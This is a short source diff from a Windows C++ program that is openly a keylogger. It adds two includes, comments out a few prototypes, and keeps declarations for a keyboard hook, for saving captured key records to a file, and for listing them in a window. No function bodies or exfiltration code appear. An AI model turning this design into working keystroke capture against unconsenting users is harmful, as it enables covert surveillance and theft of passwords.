@@ -14,6 +14,9 @@
 #include <shellapi.h>
 #include <psapi.h>
 
+#include <shlwapi.h>
+#include <cstdio>
+
 
 using namespace std;
 
@@ -73,26 +76,26 @@ INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
 void                MainWndAddMenues(HWND hwnd);
 void                MainWndAddWidgets(HWND hwnd);
 
-void                SetOpenFileParams(HWND hwnd);
+//void                SetOpenFileParams(HWND hwnd);
 
 void                DefineColumns(HWND hwndLV);
 
 
-void LoadKeyloggerRecordsFromFile(HWND hWnd);
+//void LoadKeyloggerRecordsFromFile(HWND hWnd);
 void KeyloggerFilling(HWND hwndListView);
 
 BOOL SelectFolderDialog(HWND hwnd, char* folderPath);
 void CreateFileInSelectedFolder(HWND hwnd);
 void WriteToFileANSI(const KeyloggerRecord& record);
 
-void LoadKeyloggerRecordsFromFile(HWND hwnd);
+//void LoadKeyloggerRecordsFromFile(HWND hwnd);
 
 wstring GetKeyStringFromCode(int keyCode);
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 void SetKeyboardHook();
 void RemoveKeyboardHook();
 
-std::wstring ANSIToWideString(const std::string& ansiStr);
+//std::wstring ANSIToWideString(const std::string& ansiStr);
 void OpenTextFile();
 void UpdateFilePathLabel();
 
